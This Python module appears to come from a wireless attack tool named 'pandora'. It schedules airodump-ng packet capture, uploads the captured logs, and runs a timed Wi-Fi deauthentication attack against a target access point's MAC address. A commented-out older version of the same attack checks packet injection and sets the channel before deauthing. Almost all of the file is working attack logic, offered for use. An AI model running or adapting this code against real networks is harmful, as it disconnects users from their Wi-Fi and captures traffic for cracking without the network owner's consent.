from pandora.core.crack import ADUMP
import os
import time
from datetime import datetime
from pandora.shell import airodump, aireplay, netinfo
from pandora.definitions import AIRODUMP_PATH
from pandora.core import upload, deauth
from pandora.utils.utils import logging
from pandora.config import DEAUTH_MINUTES, DEBUG

AIRODUMP = airodump.Airodump(prefix='logs_airodump', dirpath=AIRODUMP_PATH)
APLAY = aireplay.Aireplay()
IWCONFIG = netinfo.Iwconfig()

@logging
def airodump_job(interface, timeout):
    AIRODUMP.save_airodump(interface, timeout)

@logging
def upload_job():
    upload.upload()

@logging
def deauth_job(targetmac, ifname, adump_duration, schedule):
    deauther = deauth.Deauth(ADUMP)
    ADUMP.get_airodump(ifname, adump_duration)
    os.system("killall airodump-ng")
    now = datetime.now().strftime("%H:%M:%S")
    print(f"[{now}] Configuring interface {ifname}")
    deauther.deauthAP(targetmac, ifname)
    seconds = DEAUTH_MINUTES * 60
    now = datetime.now().strftime("%H:%M:%S")
    print(f"[{now}] Performing deauth attack for {DEAUTH_MINUTES} minutes")
    time.sleep(seconds)
    deauther.killDeauthAPProc()
    return schedule.CancelJob


# def deauth_job(targetmac, ifname, schedule):
#     now = datetime.now().strftime("%H:%M:%S")
#     print(f"[{now}] Configuring interface {ifname}")
#     while 1:
#         msg = APLAY.test_ap(targetmac, ifname)
#         if DEBUG:
#             print(msg)
#         if msg.find("Injection is working") != -1:
#             break
#         match = re.search(r"AP\suses\schannel\s\d{1,2}", msg)
#         channel = match[0].replace('AP uses channel ', '')
#         IWCONFIG.set_channel(ifname, channel)
#     proc = APLAY.deauth_ap(targetmac, ifname)
#     seconds = DEAUTH_MINUTES * 60
#     now = datetime.now().strftime("%H:%M:%S")
#     print(f"[{now}] Performing deauth attack for {DEAUTH_MINUTES} minutes")
#     time.sleep(seconds)
#     proc.kill()
#     return schedule.CancelJob